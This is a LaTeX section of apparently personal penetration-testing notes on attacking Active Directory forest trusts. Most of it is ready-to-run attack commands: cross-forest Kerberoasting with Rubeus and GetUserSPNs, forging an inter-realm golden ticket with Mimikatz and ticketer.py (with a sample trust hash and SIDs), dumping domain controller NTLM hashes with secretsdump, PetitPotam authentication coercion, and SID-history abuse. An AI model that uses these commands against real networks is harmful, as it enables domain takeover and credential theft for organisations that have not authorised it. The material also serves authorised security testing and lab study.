\section{Cross-Forest trust Attack}


\subsection{Cross-Forest Kerberoasting}

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed
across trusts, depending on the trust direction. In a domain with either an
inbound or bidirectional domain/forest trust, various attacks to gain a
foothold. Sometimes privilege scalation is not possible in the current domain,
but instead it is possible to obtain a Kerberos ticket and crack a hash for an
administrative user in another domain that has Domain/Enterprise Admin
privileges in both domains.

\subsubsection{Windows}
use of the \verb+-SPN+ and \verb+-Domain+ set to the trusting domain on \verb+Get-DomainUser+~\ref{tool:powerview:enum} Then a kerberoast~\ref{kerberos:kerberoasting} can be performed on the trusted domain.
\begin{verbatim}
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \
    | select SamAccountName
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
\end{verbatim}


\subsubsection{Linux}
From time to time, see users or admins from one domain as members of a group in another domain. Since only i\emph{Domain Local Groups} allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship.

To enumerate \verb+GeUserSPNs+~\ref{tool:impacket:GetUserSPNs} with
credentials for a user that can authenticate into the other domain and specify
the \verb+-target-domain+. the flag \verb+-request+ (plus \verb+-outputfile+)
provide the TGS.
\begin{verbatim}
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley 
\end{verbatim}


\subsection{Admin Password Re-Use  and Group Membership}
In a situation of a  bidirectional forest trust managed by admins from the same
company. When the Domain A is controlled and a cleartext passwords or NT hashes
for either the built-in Administrator account or an account that is part of the
Enterprise Admins or Domain Admins group in Domain A is available and Domain B
has a highly privileged account with the same name. It is worth checking for
password reuse across the two forests in this situation. 

For example, Domain A would have a user named \verb+adm_bob.smith+ in the
Domain Admins group, and Domain B had a user named \verb+bsmith_admin+.
Sometimes, the user would be using the same password in the two domains, and
owning Domain A instantly gave me full admin rights to Domain B.

Somtimes users or admins from Domain A as members of a group in Domain B. Only
\emph{Domain Local Groups} allow security principals from outside its forest.
Somtimes a Domain Admin or Enterprise Admin from Domain A as a member of the
built-in Administrators group in Domain B in a bidirectional forest trust
relationship. Taking over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

\verb+Get-DomainForeignGroupMember+~\ref{tool:powerview:enum} allow to
enumerate groups with users that do not belong to the domain, also known as
foreign group membership. 


\subsection{Inter-real TGT}

\subsubsection{Windows}

\begin{verbatim}
lsadump::trust /patch
or find the TRUST_NAME$ machine account hash
\end{verbatim}

Create a forged trust ticket (inter-realm TGT) using Mimikatz
\begin{verbatim}
kerberos::golden /export /user:<user> /id:<user_rid> /group:500,501,513,512,520,518 /rc4:<trust_nthash>  /sid:<src_domain_sid> /domain:<src_domain_FQDN> /sids:<dest_domain_sid>-<rid|519> /service:krbtgt /target:<target_domain_fqdn> /ptt [/ticket:c:\temp\trust.kirbi]
\end{verbatim}

Use the Trust Ticket file to get a ST for the targeted service
\begin{verbatim}
.\Rubeus.exe asktgs /ticket:c:\temp\trust.kirbi /service:LDAP/<dest_dc_fqdn>. /dc:<dest_dc_fqdn>/ptt
\end{verbatim}



\subsubsection{Linux}
{\bf create inter-realm golden ticket with trust key}:
\begin{verbatim}
ticketer.py \
    -nthash  226469d05ed6dba030a6ac6a82391768 \
    -domain-sid S-1-5-21-1416445593-394318334-2645530166 \
    -domain dev.admin.offshore.com \
    -extra-sid S-1-5-21-1216317506-3509444512-4230741538-519 \
    -spn krbtgt/admin.offshore.com
    -user-id 11607 \
    jubeaz
\end{verbatim}


request a TGS to parent domain:
\begin{verbatim}
KRB5CCNAME=/tmp/jubeaz.ccache getST.py \
    -debug -k -no-pass -spn cifs/dc03.admin.offshore.com \
    admin.offshore.com/jubeaz@admin.offshore.com
\end{verbatim}

use the service ticket:
\begin{verbatim}
KRB5CCNAME=jubeaz@admin.offshore.com.ccache smbclient.py \
    -k -no-pass jubeaz@dc03.admin.offshore.com


KRB5CCNAME=jubeaz@admin.offshore.com.ccache secretsdump.py \
    -k -no-pass -just-dc-ntlm jubeaz@dc03.admin.offshore.com
\end{verbatim}


\subsection{Use unconstrained delegation}

force a foreign computer to auth to a owned domain computer set with unconstained
and listen with \verb+rubeus monitor+
\begin{verbatim}
petitpotam.py -u <user> -p <passwor> -d <domain> <listener> <target>
\end{verbatim}


\subsection{Cross Forest SID History Abuse}

SID History can also be abused across a forest trust. If a user is migrated
from one forest to another and SID Filtering is not enabled, it becomes
possible to add a SID from the other forest, and this SID will be added to the
user's token when authenticating across the trust. If the SID of an account
with administrative privileges in Forest A is added to the SID history
attribute of an account in Forest B, assuming they can authenticate across the
forest, then this account will have administrative privileges when accessing
resources in the partner forest.

\begin{figure}[!ht]
  \includegraphics[width=\linewidth]{ad/trust/images/cross-forest-sid-history.png}
  \caption{Cross forest AD trust SIDHistory}
  \label{fig:cross-forest-sid-history}
\end{figure}

In the previous diagram, \verb+jjones+ user being migrated
from the \verb+INLANEFREIGHT.LOCAL+ domain to the \verb+CORP.LOCAL+ domain in a different
forest. If SID filtering is not enabled when this migration is made and the
user has administrative privileges (or any type of interesting rights such as
ACE entries, access to shares, etc.) in the \verb+INLANEFREIGHT.LOCAL+ domain,
then they will retain their administrative rights/access in
\verb+INLANEFREIGHT.LOCAL+ while being a member of the new domain,
\verb+CORP.LOCAL+ in the second forest.


\begin{verbatim}

\end{verbatim}

